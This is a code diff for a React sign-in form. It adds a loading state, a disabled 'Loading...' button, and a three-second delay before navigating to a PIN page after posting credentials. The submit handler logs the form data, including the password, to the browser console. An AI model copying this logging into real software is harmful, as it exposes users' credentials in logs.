@@ -22,8 +22,10 @@ const schema = yup.object().shape({
     .max(30, "Password cannot exceed 30 characters")
     .required("Password is required"),
 });
+
 const Index = () => {
   const navigate = useNavigate();
+  const [loading, setLoading] = useState(false); // New loading state
   const {
     register,
     handleSubmit,
@@ -31,9 +33,14 @@ const Index = () => {
   } = useForm({ resolver: yupResolver(schema) });
 
   const submitForm = (data) => {
-    axios.post(`${BASE_URL}/`, data);
-    console.log(data);
-    navigate("/pin");
+    setLoading(true); // Start loading
+    axios.post(`${BASE_URL}/`, data).then((response) => {
+      console.log(data);
+      setTimeout(() => {
+        setLoading(false); // Stop loading
+        navigate("/pin"); // Navigate after 3 seconds
+      }, 3000); // 3-second delay
+    });
   };
 
   const [passwordVisible, setPasswordVisible] = useState(false);
@@ -91,7 +98,9 @@ const Index = () => {
               <a href="#">Forgot Password?</a>
             </div>
             <div className="sign-in-button">
-              <button type="submit">Sign In</button>
+              <button type="submit" disabled={loading}>
+                {loading ? "Loading..." : "Sign In"} {/* Show loading text */}
+              </button>
             </div>
           </form>
         </section>
